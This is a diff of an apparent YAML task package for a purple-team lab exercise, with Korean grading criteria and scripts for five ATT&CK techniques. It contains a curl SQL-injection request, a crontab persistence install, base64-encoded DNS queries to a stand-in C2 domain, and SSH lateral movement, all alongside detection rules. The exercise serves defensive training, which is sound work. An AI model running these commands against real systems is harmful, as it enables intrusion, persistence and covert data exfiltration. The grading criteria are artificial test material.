@@ -44,20 +44,22 @@ steps:
     type: output_contains
     expect: Purple Team Exercise
     semantic:
-      intent: '[RED/BLUE] 퍼플팀 운영 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 퍼플팀 운영 계획 /tmp/purple_team_plan.txt — 5가지 ATT&CK 기법 선정 (T1190 SQLi · T1053.003
+        Cron · T1071.004 DNS C2 · T1021.004 SSH Lateral · T1041 Exfil) + 각 기법에 Red test procedure + Blue
+        detection query + Gap 해소 룰 작성. Red-Blue 협업 사이클: Attack → Detect → Tune → Verify. 탐지 공학 성숙도 향상'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/purple_team_plan.txt 계획서
+      - 5개 ATT&CK 기법 선정 + 각각 Attack/Detect/Tune 3단계
+      - 퍼플팀 사이클 개념
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 5 x 3 매트릭스
+      - Atomic Red Team 테스트
+      - CALDERA autonomous
+      - Scythe purple team platform
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 기법 3개 이하
+      - Attack 만 (Detect/Tune 없음)
+      - 퍼플팀 개념 없음
   target_vm: attacker
   script: 'cat > /tmp/purple_team_plan.txt << ''EOF'' === Purple Team Exercise Plan === Date: 2026-04-06
     | Duration: 150 min
@@ -88,20 +90,20 @@ steps:
     type: output_contains
     expect: Purple Test 1
     semantic:
-      intent: '[RED] 퍼플팀 운영 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 퍼플 테스트 1 T1190 SQLi — curl POST /rest/user/login SQLi + Blue 가 Suricata alert + ModSec
+        차단 로그 + Wazuh 이벤트 탐지했는지 확인. 탐지 여부 기록: detected/missed + 근거 로그. 성공하면 룰 효과 검증, 실패하면 Gap 식별'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - T1190 SQLi 실행 + Blue 탐지 확인
+      - detected/missed 판정 + 근거
+      - 퍼플팀 test 사이클 실행
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - curl SQLi + Blue 측 tail 검증
+      - Atomic Red Team T1190
+      - CALDERA 자동 실행 + 로그 수집
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 공격만 (탐지 확인 없음)
+      - detected/missed 판정 없음
+      - test 사이클 개념 없음
   target_vm: attacker
   script: 'echo "=== Purple Test 1: T1190 SQL Injection ===" && echo "[RED] Executing SQLi:" && curl -s
     "http://10.20.30.80:3000/rest/products/search?q=test%27%20UNION%20SELECT%201,2,3--" 2>/dev/null |
@@ -127,20 +129,21 @@ steps:
     type: output_contains
     expect: Purple Test 2
     semantic:
-      intent: '[RED] 퍼플팀 운영 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 퍼플 테스트 2 T1053.003 Cron Persistence — (crontab -l; echo * * * * * echo PURPLE_TEST)
+        | crontab - 설치 + Blue 탐지 시도 (Wazuh syscheck crontab 변경 룰). 탐지 실패 시 즉시 룰 추가: auditd -w /var/spool/cron
+        -p wa + Wazuh rule level 12. Gap 해소 즉시 검증 퍼플팀 핵심'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - T1053.003 cron 설치 + Blue 탐지
+      - 탐지 실패 시 즉시 룰 추가
+      - Gap 해소 즉시성
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - crontab 수정 + Wazuh syscheck 검증
+      - auditd -w 즉시 추가
+      - osquery crontab query
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 탐지 확인 없음
+      - Gap 해소 없음
+      - 즉시 검증 사이클 없음
   target_vm: attacker
   script: 'echo "=== Purple Test 2: T1053.003 Cron Persistence ===" && echo "[RED] Installing cron:" &&
     echo "*/10 * * * * echo PURPLE_TEST > /tmp/purple_beacon.txt" | crontab - && crontab -l && echo ""
@@ -169,20 +172,21 @@ steps:
     type: output_contains
     expect: Purple Test 3
     semantic:
-      intent: '[RED] 퍼플팀 운영 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 퍼플 테스트 3-4 DNS C2 + SSH Lateral — (1) T1071.004 DNS C2: python3 DNS 쿼리 base64 embedding
+        10회 (2) T1021.004 SSH 측면 이동: ssh ccc@secu + ssh ccc@web. Blue 가 DNS 엔트로피 탐지 + 내부→내부 SSH threshold
+        탐지했는지 확인. 2 테스트 병행으로 멀티 벡터 퍼플'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - DNS C2 + SSH 측면 2 테스트 실행
+      - Blue 각각 탐지 확인
+      - 2 테스트 병행 평가
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - python DNS + ssh 중첩
+      - CALDERA 조합 시나리오
+      - Atomic Red Team 체이닝
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 1 테스트만
+      - 탐지 확인 없음
+      - 퍼플팀 다중 벡터 개념 없음
   target_vm: attacker
   script: 'echo "=== Purple Test 3: T1071.004 DNS C2 ===" && for i in 1 2 3; do ENCODED=$(echo "data_$i"
     | base64 | tr -d "="); nslookup ${ENCODED}.c2.test.local 2>&1 | head -1; done && echo "[RESULT] T1071.004:
@@ -220,20 +224,21 @@ steps:
     type: output_contains
     expect: New Detection Rules
     semantic:
-      intent: '[BLUE] 퍼플팀 운영 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Gap 해소 새 탐지 룰 — (1) FIM crontab 실시간 감시 (Wazuh syscheck real-time=yes) (2) DNS 엔트로피
+        Shannon > 3.5 탐지 Suricata pcre (3) SSH 내부→내부 correlation (동일 user 5분 3 host) (4) DNS rate limit
+        (domain 도메인당 100/min). 4개 Gap 룰 동시 배포 → s2-s4 재테스트 준비'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 4개 Gap 룰 구현
+      - FIM + DNS 엔트로피 + SSH correlation + DNS rate
+      - 재테스트 준비
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - Wazuh ossec.conf + Suricata rules + local_rules
+      - Sigma rules 변환
+      - Elastic Detection rules
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 룰 2개 이하
+      - Gap 분석 없이 일반 룰
+      - 재테스트 의도 없음
   target_vm: secu
   script: 'cat > /tmp/purple_new_rules.txt << ''EOF'' === New Detection Rules from Purple Team ===
 
@@ -270,20 +275,22 @@ steps:
     type: output_contains
     expect: Coverage Change
     semantic:
-      intent: '[BLUE] 퍼플팀 운영 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] 새 룰 효과 검증 + ATT&CK 커버리지 매핑 — s5 의 4개 룰 각각에 대해 s2-s4 공격 재실행 시 탐지 가능 여부 논리적 평가 (실제
+        재실행 아닌 논리 검증) + 결과를 /tmp/attack_coverage_updated.json 에 ATT&CK Navigator layer 포맷 (T1190/T1053/T1071.004/T1021.004
+        각각 score 1=detected / 0=not). 커버리지 정량 향상 추적'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 4개 룰 효과 논리 검증
+      - ATT&CK Navigator layer JSON
+      - score 기반 커버리지 추적
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - 수동 검증 + Navigator layer
+      - DeTT&CT 공식 도구
+      - CALDERA 자동 재실행
+      - Elastic Detection rules validation
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 검증 없이 룰 배포만
+      - ATT&CK 매핑 없음
+      - 정량 추적 없음
   target_vm: siem
   script: 'echo "=== Rule Validation ===" && echo "[Test 2 Retry] FIM on crontab: WOULD DETECT (realtime
     monitoring)" && echo "[Test 3 Retry] DNS entropy > 3.5: WOULD DETECT (30+ char base64 pattern)" &&
@@ -312,20 +319,21 @@ steps:
     type: output_contains
     expect: Purple Team ROI
     semantic:
-      intent: '[RED/BLUE] 퍼플팀 운영 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 퍼플팀 ROI + 지속 운영 계획 /tmp/purple_roi.md — (1) ROI 지표: 세션당 Gap 해소 수·탐지 커버리지 변화·MTTD
+        개선 (2) 지속 운영: 월간 세션 일정·신규 ATT&CK 기법 도입·MITRE ATT&CK Evaluations 벤치마크 (3) 거버넌스: SOC-Red-Blue 역할
+        분담·에스컬레이션 프로세스·결과 대시보드. 퍼플팀을 이벤트 아닌 프로세스로 제도화'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/purple_roi.md 파일
+      - ROI 지표 + 지속 운영 + 거버넌스
+      - 이벤트 vs 프로세스 구분
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 3섹션
+      - SANS purple team framework
+      - MITRE ATT&CK Evaluations vendor 참조
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - ROI 수치 없음
+      - 일회성 이벤트로만
+      - 거버넌스 없음
   target_vm: attacker
   script: 'cat > /tmp/purple_roi.txt << ''EOF'' === Purple Team ROI Analysis ===
 
@@ -362,20 +370,22 @@ steps:
     - Purple Team Exercise Report
     - 보고서
     semantic:
-      intent: '[RED/BLUE] 퍼플팀 운영 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 퍼플팀 종합 보고서 /tmp/purple_report.txt — 5개 ATT&CK 테스트 결과 (detected/missed/tuned)
+        + 탐지 커버리지 before vs after 비교 그래프 데이터 + 학습 사항 (공격자 TTP 진화·탐지 공학 모범 사례) + 향후 6개월 로드맵. 환경 정리 (crontab
+        -r + DNS 스크립트 rm + Purple test 흔적 정리)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/purple_report.txt 보고서
+      - 5 ATT&CK 테스트 + before/after 커버리지
+      - 학습 + 로드맵
+      - 정리 수행
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 표
+      - MITRE ATT&CK Navigator diff export
+      - DeTT&CT coverage heatmap
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - before/after 비교 없음
+      - 로드맵 없음
+      - 정리 누락
   target_vm: attacker
   script: 'rm -f /tmp/purple_*.txt /tmp/purple_*.json 2>/dev/null && cat > /tmp/purple_team_report.txt
     << ''EOF'' === Purple Team Exercise Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
